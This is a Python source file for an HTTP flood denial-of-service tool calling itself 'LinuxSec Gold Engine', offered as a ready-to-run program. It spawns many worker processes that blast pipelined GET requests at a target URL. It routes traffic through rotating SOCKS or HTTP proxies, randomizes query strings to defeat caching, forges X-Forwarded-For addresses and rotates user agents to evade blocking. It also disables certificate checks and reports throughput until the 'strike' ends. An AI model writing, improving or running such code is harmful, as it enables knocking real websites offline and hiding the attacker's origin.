import sys
import multiprocessing
import time
import random
import string
import socket
import ssl
import os
from urllib.parse import urlparse

# LinuxSec Gold Engine V8.1 (Proxy Rotation Edition)
# Professional Grade: Time/Volume Limits + RPS Control + Multi-Proxy Rotation

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

def get_random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def socks5_handshake(s, host, port):
    # Method Selection
    s.sendall(b"\x05\x01\x00")
    if s.recv(2) != b"\x05\x00": return False
    # Connect
    try: ip = socket.gethostbyname(host)
    except: return False
    addr = socket.inet_aton(ip)
    s.sendall(b"\x05\x01\x00\x01" + addr + port.to_bytes(2, 'big'))
    res = s.recv(10)
    return len(res) > 0 and res[1] == 0

def socks4_handshake(s, host, port):
    try: ip = socket.gethostbyname(host)
    except: return False
    addr = socket.inet_aton(ip)
    s.sendall(b"\x04\x01" + port.to_bytes(2, 'big') + addr + b"user\x00")
    res = s.recv(8)
    return len(res) > 0 and res[1] == 0x5a

def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val, rps_pacer, proxies, proxy_type):
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc
        path = parsed.path if parsed.path else "/"
        scheme = parsed.scheme
    except:
        host, path, scheme = target_url, "/", "http"

    target_port = int(port) if port else (443 if scheme == 'https' else 80)
    
    while True:
        if limit_type == 'time' and time.time() >= end_time: break
        if limit_type == 'req' and shared_req.value >= limit_val: break

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            
            curr_host, curr_port = host, target_port
            
            if proxies:
                proxy = random.choice(proxies)
                p_host, p_port = proxy.split(':')
                s.connect((p_host, int(p_port)))
                
                if proxy_type == 'socks5':
                    if not socks5_handshake(s, host, target_port): raise Exception()
                elif proxy_type == 'socks4':
                    if not socks4_handshake(s, host, target_port): raise Exception()
                elif proxy_type == 'http' and (scheme == 'https' or target_port == 443):
                    # HTTP CONNECT Tunnel
                    s.sendall(f"CONNECT {host}:{target_port} HTTP/1.1\r\nHost: {host}:{target_port}\r\n\r\n".encode())
                    if b"200 Connection established" not in s.recv(1024): raise Exception()
            else:
                s.connect((host, target_port))

            if scheme == 'https' or target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
                s = ctx.wrap_socket(s, server_hostname=host if not host.replace('.','').isdigit() else None)
            
            s.settimeout(1)
            payload_pool = []
            for _ in range(200): # Smaller pool to save mem with proxies
                ua = random.choice(USER_AGENTS)
                rand_path = f"{path}{'&' if '?' in path else '?'}{get_random_string(3)}={get_random_string(10)}"
                headers = [
                    f"GET {rand_path} HTTP/1.1",
                    f"Host: {host}",
                    f"User-Agent: {ua}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.9",
                    "Connection: keep-alive",
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                ]
                random.shuffle(headers[1:])
                payload_pool.append(("\r\n".join(headers) + "\r\n\r\n").encode())

            while True:
                if limit_type == 'time' and time.time() >= end_time: break
                if limit_type == 'req' and shared_req.value >= limit_val: break
                if rps_pacer > 0: time.sleep(rps_pacer)

                burst_size = 100 if rps_pacer == 0 else 1 
                full_payload = b"".join(random.choices(payload_pool, k=burst_size))
                
                try:
                    s.sendall(full_payload)
                    with shared_req.get_lock(): shared_req.value += burst_size
                    with shared_bytes.get_lock(): shared_bytes.value += len(full_payload)
                except: break 
        except:
            with shared_err.get_lock(): shared_err.value += 1
            if rps_pacer > 0: time.sleep(0.01)
        finally:
            if s:
                try: s.close()
                except: pass

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("threads", type=int)
    parser.add_argument("duration", type=int)
    parser.add_argument("port", type=int)
    parser.add_argument("mode", type=int)
    parser.add_argument("limit_type")
    parser.add_argument("rps", type=int)
    parser.add_argument("--proxy-file", default=None)
    parser.add_argument("--proxy-type", default="http")
    
    args = parser.parse_args()
    
    proxies = []
    if args.proxy_file and os.path.exists(args.proxy_file):
        with open(args.proxy_file, 'r') as f:
            proxies = [l.strip() for l in f if ':' in l]

    shared_req = multiprocessing.Value('i', 0)
    shared_bytes = multiprocessing.Value('Q', 0)
    shared_err = multiprocessing.Value('i', 0)

    rps_pacer = 0
    if args.rps > 0:
        rps_per_th = args.rps / args.threads
        if rps_per_th > 0: rps_pacer = 1.0 / rps_per_th

    end_time = time.time() + args.duration if args.limit_type == 'time' else time.time() + 604800
    
    print(f"[*] LinuxSec Proxy Core | Mode: {args.limit_type.upper()} | Proxies: {len(proxies)} ({args.proxy_type})")
    print(f"[*] Target: {args.url} | Workers: {args.threads}")
    sys.stdout.flush()

    processes = []
    for _ in range(args.threads):
        p = multiprocessing.Process(target=attack_proc, args=(
            args.url, end_time, args.port, args.mode, shared_req, shared_bytes, shared_err, 
            args.limit_type, args.duration, rps_pacer, proxies, args.proxy_type
        ))
        p.daemon = True
        p.start()
        processes.append(p)

    start_time = time.time()
    last_bytes = 0
    try:
        while True:
            if args.limit_type == 'time' and time.time() >= end_time: break
            if args.limit_type == 'req' and shared_req.value >= args.duration: break
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            curr_bytes = shared_bytes.value
            mbps = ((curr_bytes - last_bytes) * 8) / (1024 * 1024)
            last_bytes = curr_bytes
            
            progress = f"{elapsed}:{args.duration}" if args.limit_type == 'time' else f"{min(100, int((shared_req.value/args.duration)*100))}:100"
            print(f"PROGRESS:{progress} | REQ: {shared_req.value} | THROUGHPUT: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
            sys.stdout.flush()
    except KeyboardInterrupt: pass

    for p in processes: p.terminate()
    print("[*] Strike Completed.")

if __name__ == "__main__":
    main()
